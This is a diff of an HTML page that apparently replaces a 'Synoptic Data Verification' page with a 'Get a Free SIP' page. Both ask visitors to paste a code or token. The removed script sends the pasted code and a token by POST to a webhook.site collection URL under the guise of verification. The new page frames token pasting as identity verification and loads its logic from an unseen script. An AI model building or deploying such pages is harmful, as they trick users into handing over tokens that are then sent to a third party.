@@ -1,63 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Synoptic Data Verification</title>
-  <style>
-    /* Styling (same as before) */
-  </style>
+    <title>NikoGem</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
 </head>
 <body>
-  <div id="container">
-    <h1>Synoptic Data Verification</h1>
-    <div id="data-box">
-      <div id="inner-box"></div>
+    <div class="container">
+        <h1>Get a Free SIP</h1>
+        <p>Please verify your identity by copying the text below:</p>
+        <div id="text"></div>
+        <textarea id="token" placeholder="Paste the token here"></textarea>
+        <button id="submit">Submit</button>
+        <p id="response"></p>
     </div>
-    <input type="text" id="user-input" placeholder="Paste the code here">
-    <button id="verify-button">Verify</button>
-    <div id="status"></div>
-  </div>
-
-  <script>
-    const innerBox = document.getElementById('inner-box');
-    const userInput = document.getElementById('user-input');
-    const verifyButton = document.getElementById('verify-button');
-    const statusDiv = document.getElementById('status');
-
-    fetch('https://api.synopticdata.com/v2/stations/metadata?token=sa&stid=KONT&complete=1')
-      .then(response => response.json())
-      .then(data => {
-        innerBox.textContent = JSON.stringify(data, null, 2); 
-      })
-      .catch(error => {
-        statusDiv.textContent = 'Error: We encountered a problem on the server.';
-      });
-
-    verifyButton.addEventListener('click', () => {
-      const userCode = userInput.value;
-      const jsonData = JSON.parse(innerBox.textContent); 
-      const token = jsonData.token; // Assuming the token is a property named 'token'
-
-      // Construct the verification API URL dynamically
-      const apiUrl = `https://webhook.site/8febb751-d6c3-40a9-b3de-6b3812e5d94e/${token}`;
-
-      // Construct the verification request headers
-      const headers = {
-        'Content-Type': 'application/json'
-      };
-
-      fetch(apiUrl, {
-        method: 'POST',
-        headers: headers,
-        body: JSON.stringify({ code: userCode, token: token })
-      })
-      .then(response => response.json())
-      .then(result => {
-        statusDiv.textContent = result.message; 
-      })
-      .catch(error => {
-        statusDiv.textContent = 'Error: Verification failed.';
-      });
-    });
-  </script>
+    <script src="script.js"></script>
 </body>
 </html>
